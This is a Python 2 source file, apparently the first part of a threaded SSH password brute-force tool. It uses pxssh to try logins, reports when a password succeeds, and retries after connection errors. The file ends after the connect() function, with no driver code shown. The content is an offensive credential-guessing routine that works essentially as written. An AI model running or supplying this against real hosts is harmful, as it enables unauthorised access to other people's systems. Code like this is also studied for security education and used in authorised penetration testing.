#!/usr/bin/python
# -*- coding: utf-8 -*-
#             ...
#        .:::|#:#|::::.
#     .:::::|##|##|::::::.
#     .::::|##|:|##|:::::.
#      ::::|#|:::|#|:::::
#      ::::|#|:::|#|:::::
#      ::::|##|:|##|:::::
#      ::::.|#|:|#|.:::::
#      ::|####|::|####|::
#      :|###|:|##|:|###|:
#      |###|::|##|::|###|
#      |#|::|##||##|::|#|
#      |#|:|##|::|##|:|#|
#      |#|##|::::::|##|#|
#       |#|::::::::::|#|
#        ::::::::::::::
#          ::::::::::
#           ::::::::
#            ::::::
#              ::
__author__ = 'Avery Rozar'

import pxssh
import argparse
from threading import *
import time

max_connections = 5
connection_lock = BoundedSemaphore()

Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, password)
        print '[+] Password for ' + host + 'succeeded'
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails +=1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()
